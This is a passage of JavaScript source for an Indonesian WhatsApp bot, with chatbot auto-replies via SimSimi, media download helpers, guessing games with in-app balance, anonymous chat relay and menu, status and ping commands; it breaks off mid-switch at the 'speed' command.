const isAllMedia = type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage'
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == 'stickerMessage' && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || '' : ''
//================================================================================\\
if (autobio) {
Araa.setStatus(`${botName} | ⏰ ${runtime(process.uptime() )}`)
}
//================================================================================\\
if (autoread) {
Araa.readMessages([m.key])
}
//================================================================================\\
if (!isGroup && !isCmd && !m.key.fromMe && autorespon && !isSticker && !isAudio && !isMedia) {
try {
let randomText = ["Ara Ara Kak","Iy Kak","Ada apa kak","🗿","🐦","Afa iy","Apa","Oh","Ok"]
let simiV2 = pickRandom(randomText)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`, { methods: 'GET' })
let sami = simi.success
Araa.sendMessage(from, { text: `${sami}` }, { quoted: m }) 
} catch (err) {
console.log(err)
Araa.sendMessage(from, { text: `${simiV2}` }, { quoted: m })             
}
}
//================================================================================\\
if (isGroup && isProtocol) {
try {
let key = proto.Message.ProtocolMessage.key
let msg = await Araa.serializeM(await store.loadMessage(key.remoteJid, key.id))
let teks = `*「 PESAN DITARIK TERDETEKSI 」*
› Dari : *@${sender.split("@")[0]}*
› Waktu : ${timeWib}
› Tanggal : ${calender}
› Type : ${msg.mtype}`
let buttons = [{ buttonId: `PPPPPP`, buttonText: { displayText: `ok` }, type: 'RESPONSE' }]                            
Araa.sendMessage(from, { text: teks, mentions: [sender], buttons }, { quoted: m })
} catch (err) {
console.log(err)
}
}
//================================================================================\\
async function makeSticker(media, Sticker, StickerTypes) {
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00', // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Araa.sendMessage(from, { sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
}
//================================================================================\\
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download video with ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Araa.sendMessage(from, { video: fs.readFileSync(mp4File), caption: 'Nih!', gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
setReply(`${err}`)
}
}
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download audio with ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Araa.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
console.log(color(err))
}
}
const scdlMp3 = async (Link) => {
let scdl = await SoundCloud.create()
let track = await scdl.tracks.getTrack(Link)
let mp3File = getRandom('.mp3')
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
let request = new FFMPEGRequest({
input: {
path: mp3File,
},
output: {
path: opusFile,
bitrate: 128,
},
})
Ffmpeg.convert(request)
.then(async (filePath) => {
// Done
await Araa.sendMessage(from,{contextInfo: {externalAdReply: {title: 'Speed',body: 'Now Playing...',description: 'Now Playing...',mediaType: 2,thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`,},},audio: fs.readFileSync(filePath),mimetype: 'audio/mp4',},{ quoted: m })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch((error) => {
setReply(error)
})
})
}
const scdlDoc = async (Link) => {
let scdl = await SoundCloud.create()
let track = await scdl.tracks.getTrack(Link)
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await Araa.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
}
//================================================================================\\
if (!isGroup && !isCmd) console.log(color('[PRIVATE]', 'greenyellow'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(budy, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd) console.log(color('[GRUP]', 'gold'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(budy, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, 'deeppink'))
if (!isGroup && isCmd) console.log(color('[CMD]', 'blue'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd) console.log(color('[CMD]', 'blue'),color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'),color(`${command} [${args.length}]`, 'cyan'),color('dari', 'gold'),color(`${pushname}`, 'orange'),color('di gc', 'purple'),color(groupName, 'deeppink'))
//================================================================================\\
Araa.math = Araa.math ? Araa.math : {}
if (isGroup && from in Araa.math) {
console.log(Araa.math)
try {
let id = from
if (!(id in Araa.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(Araa.math[id][1]))
if (budy == math.result) {
addBalance(senderNumber, math.bonus)
clearTimeout(Araa.math[id][3])
delete Araa.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {
if (--Araa.math[id][2] == 0) {
clearTimeout(Araa.math[id][3])
delete Araa.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${Araa.math[id][2]} kesempatan`)
}
} catch (e) {
console.log(e)
}
}
//================================================================================\\
if ((Input == botNumber && isGroup && !isCmd && !isAudio) || (mentionByReplySticker == botNumber && isSticker && !isCmd)) {
try {
await sleep(2000)
Araa.sendPresenceUpdate('composing', from)
if (isQuotedReplySticker || isReplySticker) {
await sleep(2000)
let namastc = await pickRandom(setiker)
console.log(namastc)
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
Araa.sendMessage(from, { sticker: buffer }, { quoted: m })
} else {
let jawab = ['Afa iyah 🗿', 'Oh', 'Aku ga ngerti om 🐦', 'Boong', '🗿', '🐦', 'Oh gitu 🐦']
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`, `${teks2}`]
let random = pickRandom(hasil)
const { findPhoneNumbersInText, parsePhoneNumber } = require('libphonenumber-js')
let yakuk = await parsePhoneNumber('+' + senderNumber)
let idnya = yakuk.country
console.log(idnya)
let kata = body.replace(`@${botNumber.split('@')[0]}`, '')
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${kata}&lc=${idnya.toLowerCase()}`, { methods: 'GET' })
let sami = simi.success
if (sami.startsWith('Aku tidak mengerti')) {
var teksnya = random
} else {
var teksnya = sami
}
await sleep(2000)
Araa.sendMessage(from, { text: teksnya }, { quoted: m })
}
} catch (err) {
console.log(err)
setReply('Simi ga tau mau ngomong apa')
}
}
//================================================================================\\
let nomerAsing = senderNumber.startsWith('212') || senderNumber.startsWith('252')
if (!isGroup && nomerAsing) {
console.log(`Nomer asing dari ${senderNumber}`)
return Araa.updateBlockStatus(sender, 'block')
}
if (setiker.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
let namastc = messagesC
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
Araa.sendMessage(from, { sticker: buffer }, { quoted: m })
}
for (let anju of audionye) {
if (budy === anju) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return sendSticker(spam2)
let buffer = fs.readFileSync(`./media/audio/${anju}.mp3`)
sendvn(buffer) 
addSpam('NotCase', senderNumber, '10s', AntiSpam)
}
}
//================================================================================\\
let regex = ['bilek', 'banh', 'cum', 'kntl', 'anjing', 'mmk', 'bang', 'wibu', 'pantek', 'pepek', 'hentai']
for (let i of regex) {
if (!cekSpam('NotCase', senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)) {
addSpam('NotCase', senderNumber, '10s', AntiSpam)
let emot = await pickRandom(['🗿', '👍', '🙄', '😝', '😏', '💩', '👻', '🔥', '🤣', '🤬', '😎', '😂', '😘', '😑', '😱', '❤️', '🔥', '😳', '😍', '🤩', '🥳', '🤔', '🤗', '🤤', '👎', '👊', '🙈', '🤡'])
Araa.sendMessage(from, { react: { text: emot, key: m.key } })
}
}
//================================================================================\\
for (let i = 0; i < listcmdblock.length; i++) {
if (command === listcmdblock[i].cmd) {
if (autoblockcmd) {
return setReply(mess.block.Bsystem)
} else {
return setReply(mess.block.Bowner)
}
}
}
//================================================================================\\
if (isGroup && getidAfk(from, users)) {
setReply(`Jangan Ganggung ${getNameAfk(from, users)}`)        
}        
if (isGroup && isAfk) {
delAfk(from, sender)
setReply(`KAMU TELAH KEMBALI DARI AFK`)
}
//================================================================================\\
const roomChat = Object.values(anonChat).find((room) => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find((room) => room.a == m.sender)
const roomB = Object.values(anonChat).find((room) => room.b == m.sender)
const room = Object.values(anonChat).find((room) => room.state == 'WAITING' && room.b == '')
if (roomChat && !isCmd && !isGroup && roomChat.b !== '') {
let other = [roomChat.a, roomChat.b].find((user) => user !== m.sender)
m.copyNForward(other, true)
}
if (room && Date.now() >= room.expired) {
await Araa.sendMessage(room.a, { text: 'Partner tidak di temukan\nKamu telah keluar dari room anonymous' })
anonChat.splice(anonChat.indexOf(room, 1))
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
}
//================================================================================\\
if (cekTebakgambar(senderNumber)){
if (body == getJawabanTebakgambar(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebakgambar(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebakgambar(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebakgambar(senderNumber)}`) 
delTebakgambar(senderNumber)
}

if (cekCaklontong(senderNumber)){
if (body == getJawabanCaklontong(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanCaklontong(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delCaklontong(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanCaklontong(senderNumber)}`) 
delCaklontong(senderNumber)
}

if (cekTebakkata(senderNumber)){
if (body == getJawabanTebakkata(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebakkata(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebakkata(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebakkata(senderNumber)}`) 
delTebakkata(senderNumber)
}

if (cekTebakbendera(senderNumber)){
if (body == getJawabanTebakbendera(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebakbendera(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebakbendera(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebakbendera(senderNumber)}`) 
delTebakbendera(senderNumber)
}

if (cekTebakkalimat(senderNumber)){
if (body == getJawabanTebakkalimat(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebakkalimat(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebakkalimat(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebakkalimat(senderNumber)}`) 
delTebakkalimat(senderNumber)
}

if (cekSiapaaku(senderNumber)){
if (body == getJawabanSiapaaku(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanSiapaaku(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delSiapaaku(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanSiapaaku(senderNumber)}`) 
delSiapaaku(senderNumber)
}

if (cekTebaklirik(senderNumber)){
if (body == getJawabanTebaklirik(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebaklirik(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebaklirik(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebaklirik(senderNumber)}`) 
delTebaklirik(senderNumber)
}

if (cekTebaktebakan(senderNumber)){
if (body == getJawabanTebaktebakan(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanTebaktebakan(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delTebaktebakan(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanTebaktebakan(senderNumber)}`) 
delTebaktebakan(senderNumber)
}

if (cekSusunkata(senderNumber)){
if (body == getJawabanSusunkata(senderNumber)){
setReply(`Selamat jawaban kamu benar\nJawabannya adalah ${getJawabanSusunkata(senderNumber)}\nDan berhasil mendapatkan saldo 5000`) 
addBalance(senderNumber, 5000)
delSusunkata(senderNumber) 
} else sleep(60000)
setReply(`Jawabannya adalah ${getJawabanSusunkata(senderNumber)}`) 
delSusunkata(senderNumber)
}
//================================================================================\\
if (cekPengirimMenfes(sender)) {
if (getChatPengirimMenfes(sender) && !isGroup) {
Araa.sendMessageV2(getIdPenerimaMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } }, text: body })
} 
}

if (cekPenerimaMenfes(sender)) {
if (getChatPenerimaMenfes(sender) && !isGroup) {
Araa.sendMessageV2(getIdPengirimMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } }, text: body })
} 
}
//================================================================================\\
if (isCmd) Succes(toFirstCase(command), dash, allcommand)
//================================================================================\\
try {
switch (command) {
case 'menu':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let menunya = allmenu(getLimit, senderNumber, getBalance, isPremium, thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let mok = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: `ᴏᴡɴᴇʀ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}infobotz`, buttonText: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}sewa`, buttonText: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ` }, type: 'RESPONSE' },
]
const muk = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${nomerOwner}` } },
{ urlButton: { displayText: `Devoloper`, url: `https://wa.me/${devoloper1}` } },
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules` } },
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}infobotz` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } },
]
let options1 = {
forward,
externalAdReply: {
showAdAttribution: true,
title: botName,
body: fake,
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: thumb,
sourceUrl: `https://wa.me/${devoloper1}`,
},
}
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: `MENU`, rowId: `${prefix}menu simpel`},
{title: `OWNER`, rowId: `${prefix}owner`},
{title: `INFO`, rowId: `${prefix}infobotz`},
{title: `RULES`, rowId: `${prefix}rules`},
{title: `SEWA`, rowId: `${prefix}sewa`}, 
{title: `SCRIPT`, rowId: `${prefix}script`}, 
]}]
const listMessage = { text: menunya, mentions: [sender], footer: fake, title: ``, buttonText: "Click Here", sections }
if (setmenu == 'document' && !args[0]) {
Araa.sendButDoc(from, menunya + readmore + '\n' + fiturnya, fake, fs.readFileSync('./media/image/thumbnaildokumen.jpg'), mok, options1, { quoted: setQuoted })
} else if (setmenu == 'location' && !args[0]) {
Araa.sendButLoc(from, menunya, '' + readmore + fiturnya + '\n' + fake, zfrply, mok, options1, { quoted: setQuoted })
} else if (setmenu == 'image' && !args[0]) {
Araa.sendButImage(from, menunya, readmore + fiturnya, thumb, mok, { quoted: setQuoted })
} else if (setmenu == 'gif' && !args[0]) {
Araa.sendButGif(from, menunya + readmore + '\n' + fiturnya, fake, fs.readFileSync('./media/video/video.mp4'), mok, fs.readFileSync('./media/image/fake gif.jpeg'), { quoted: setQuoted })
} else if (setmenu == 'video' && !args[0]) {
Araa.sendButVideo(from, menunya + readmore + '\n' + fiturnya, fake, fs.readFileSync('./media/video/video.mp4'), mok, { quoted: setQuoted })
} else if (setmenu == 'location2' && !args[0]) {
Araa.send5ButLoc(from, menunya + readmore + '\n' + fiturnya, fake, zfrply, muk, { quoted: setQuoted })
} else if (setmenu == 'image2' && !args[0]) {
Araa.send5ButImg(from, menunya + readmore + '\n' + fiturnya, fake, thumb, muk, { quoted: setQuoted })
} else if (setmenu == 'gif2' && !args[0]) {
Araa.send5ButGif(from, menunya + readmore + '\n' + fiturnya, fake, fs.readFileSync('./media/video/video.mp4'), muk, fs.readFileSync('./media/image/fake gif.jpeg'), { quoted: setQuoted })
} else if (setmenu == 'video2' && !args[0]) {
Araa.send5ButVideo(from, menunya + readmore + '\n' + fiturnya, fake, fs.readFileSync('./media/video/video.mp4'), muk, { quoted: setQuoted })
} else if (setmenu == 'katalog' && !args[0]) {
Araa.sendKatalog(from, 'ALL MENU BOT', menunya + readmore + '\n' + fiturnya, thumb, { quoted: setQuoted })
} else if (setmenu == 'buttonlist' && !args[0]) {
Araa.sendMessage(from, listMessage, { quoted: setQuoted })
} else if (args[0] == 'simpel') {
setReply(fiturnya) 
}
break
case 'sc':
case 'script':
case 'sourcecode':
setReply("SC GK DI JUAL KAK\nINI BOT PRIBADI YANG DI KEMBANGKAN OWNER SENDIRI") 
break
case 'd':
case 'del':
case 'delete':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!mentionByReply) return setReply('Reply pesannya')
if (mentionByReply == botNumber) {
Araa.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if (mentionByReply !== botNumber && isBotGroupAdmins) {
if (!isGroupAdmins && !isOwner) return onlyAdmin()
Araa.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: mentionByReply } })
}
break
case 'react':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Contoh ${prefix + command} 😝`)
let reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: true, id: quoted.id },
},
}
Araa.sendMessage(from, reactionMessage)
}
break
case 'info':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const si = require('systeminformation')
let OsInfo = await si.osInfo()
let System = await si.system()
let Cpu = await si.cpu()
let Mem = await si.mem()
let { platform, distro, release, codename, kernel, arch, hostname, fqdn, codepage, logofile } = OsInfo
let { manufacturer, brand, vendor, family, model, stepping, revision, voltage, speed, speedMin, speedMax, governor, cores, physicalCores, processors } = Cpu
let { total, free, used, active, available, buffers, cached, slab, buffcache } = Mem
let teks = `System Information`
teks += `

Uptime : ${kyun(os.uptime())}

*OS INFO*
Platform: ${platform}
Distro: ${distro}
Release: ${release}
Codename: ${codename}
Kernel: ${kernel}
Arch: ${arch}
Hostname: ${hostname}
Codepage: ${codepage}

*CPU INFO*
Manufacturer: ${manufacturer}
Brand: ${brand}
Vendor: ${vendor}
Family: ${family}
Model: ${model}
Speed: ${speed} Ghz
Governor: ${governor}
Cores: ${cores}
PhysicalCores: ${physicalCores}
Processors: ${processors}

*MEMORY INFO*
Memory : ${FileSize(used)}/${FileSize(total)} 
Free : ${FileSize(free)}
Cached: ${FileSize(cached)}
`
setReply(teks)
}
break
case 'dashboard':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = `
*Dashboard*
        
Runtime : ${runtime(process.uptime())}
Total Hit : ${thisHit.toLocaleString()}`
let fall = '*Commands Today*  \n'
let totalFail = []
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function (e, i) {
fall += '*•*' + ` ${e.cmd} : ${e.succes + e.failed} \n`
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
})
for (let i = 0; i < totalFail.length; i++) {
total += totalFail[i]
}
for (let a = 0; a < totalSuc.length; a++) {
tot += totalSuc[a]
}
let akoh = `Total : ${dash.length} used`
let tod = '*Command Failed*\n'
let filteredArray = await dash.filter((item) => item.failed > 0)
await filteredArray.map(async function (e, i) {
tod += '*•*' + ` ${e.cmd} : ${e.failed} \n`
})
let aw = `Total : ${filteredArray.length} failed`
let tekz = teks + '\n\n' + fall + '\n' + akoh + '\n\n' + '*Command Status* \n' + ' *•* Succes : ' + tot + '\n' + ' *•* Failed : ' + total + '\n\n' + tod + '\n\n'
setReply(tekz)
}
break
case 'sewa':{
let { dada } = require('../message/sewabot.js')
let teks = dada(prefix, pushname, ucapanWaktu)
let gbutsan = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: `ᴏᴡɴᴇʀ` }, type: 1 },
{ buttonId: `KODE QR`, buttonText: { displayText: `ᴋᴏᴅᴇ ϙʀ` }, type: 1 },
]
Araa.sendButLoc(from, teks, fake, zfrply, gbutsan)
}
break
case 'status':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let osu = require('node-os-utils')
try {
let NotDetect = 'Not Detect'
let old = performance.now()
let cpu = osu.cpu
let cpuCore = cpu.count()
let drive = osu.drive
let mem = osu.mem
let netstat = osu.netstat
let OS = osu.os.platform()
let cpuModel = cpu.model()
let cpuPer
let p1 = cpu.usage().then((cpuPercentage) => {
var cpuPer = cpuPercentage
}).catch(() => {
var cpuPer = NotDetect
})
let driveTotal, driveUsed, drivePer
let p2 = drive
.info()
.then((info) => {
;(driveTotal = info.totalGb + ' GB'), (driveUsed = info.usedGb), (drivePer = info.usedPercentage + '%')
})
.catch(() => {
;(driveTotal = NotDetect), (driveUsed = NotDetect), (drivePer = NotDetect)
})
let ramTotal, ramUsed
let p3 = mem
.info()
.then((info) => {
;(ramTotal = info.totalMemMb), (ramUsed = info.usedMemMb)
})
.catch(() => {
;(ramTotal = NotDetect), (ramUsed = NotDetect)
})
let netsIn, netsOut
let p4 = netstat
.inOut()
.then((info) => {
;(netsIn = info.total.inputMb + ' MB'), (netsOut = info.total.outputMb + ' MB')
})
.catch(() => {
;(netsIn = NotDetect), (netsOut = NotDetect)
})
await Promise.all([p1, p2, p3, p4])
await setReply(`_Testing ${command}..._`)
let _ramTotal = ramTotal + ' MB'
let neww = performance.now()
let teks = `
*「 Status 」*

OS : *${OS}*
CPU Model : *${cpuModel}*
CPU Core : *${cpuCore} Core*
CPU : *${cpuPer ? `${cpuPer}%` : 'Not Found'}*
Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) && /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
Ping : *${Math.round(neww - old)} ms*
Internet IN : *${netsIn}*
Internet OUT : *${netsOut}*
`
let mok = [
{ buttonId: `${prefix}infobotz`, buttonText: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}sewa`, buttonText: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ` }, type: 'RESPONSE' },
]
Araa.sendButLoc(from, teks, fake, zfrply, mok)
} catch (err) {
setReply(err)
}
}
break
case 'ping':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
setReply(respon)
}
break
case 'owner':
Araa.sendContact(from, nomerOwner, ownerName)
break
case 'readmore':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return setReply('Penggunaan teks| teks')
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
setReply(`${text1}${readmore}${text2}`)
}
break
case 'infobotz':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
var groups = totalchat.filter((v) => v.endsWith('g.us'))
var privat = totalchat.filter((v) => v.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
var ram3 = `${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
let uptime = process.uptime()
const timestampu = speed()
var total = math(`${groups.length} ${privat.length}`)
var wa_version = Araa.waVersion
var mcc = 'Error'
var mnc = 'Error'
var os_version = 'Error'
var device_manufacturer = 'Error'
var device_model = 'Error'
let gender = 'Female'
let nomerOwner = `${nomerOwner}`
let menunya = `
「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」

*▸* Nama : ${botName}
*▸* Gender : ${gender}
*▸* Private Chat : ${privat.length}
*▸* Group Chat : ${groups.length}
*▸* Total Chat : ${totalchat.length}
*▸* Speed : ${latensi.toFixed(4)} second
*▸* Penggunaan Ram : ${ram2}
*▸* Hostname : ${os.hostname()}
*▸* Platform : ${os.platform()}
*▸* Device Model: ${device_model}
*▸* Device Manufactur : ${device_manufacturer}
*▸* Wa Version: ${wa_version}
*▸* Os Version: ${os_version}
*▸* Owner : ${nomerOwner}
*▸* Tgl pembuatan : 25 Juli 2021
*▸* Tgl release : 29 September 2021
*▸* Tgl sekarang : ${calender}
*▸* Image : Girl Front Line G11
*▸* Voice : Nina kawai

*▸* SCRIPT BY
   Decode Denpa
   X-Dev Team
   Yogi PW
   Hexagon
   Dttaz

*▸* FEATURE  BY  
   Decode Denpa
   Fernazer
   X-Dev Team
   Resta Gamteng
   Zeeone Ofc
   X-Dev Team
   Yudha perdana
   Xchilds
   Dika Ardnt
`
let info = thumb
let options2 = {
contextInfo: {
forward,
externalAdReply: { title: `${ucapanWaktu} ${pushname}`, body: `*click here to play music`, mediaType: '2', thumbnail: thumb, mediaUrl: `https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link` },
},
}
let gbutsan = [
{ buttonId: 'YOUTUBE', buttonText: { displayText: `ʏᴏᴜᴛᴜʙᴇ` }, type: 1 },
{ buttonId: 'RULES', buttonText: { displayText: `ʀᴜʟᴇs` }, type: 1 },
]
Araa.sendButImage(from, menunya, fake, thumb, gbutsan)
}
break
case 'runtime':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
break
case 'speed':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
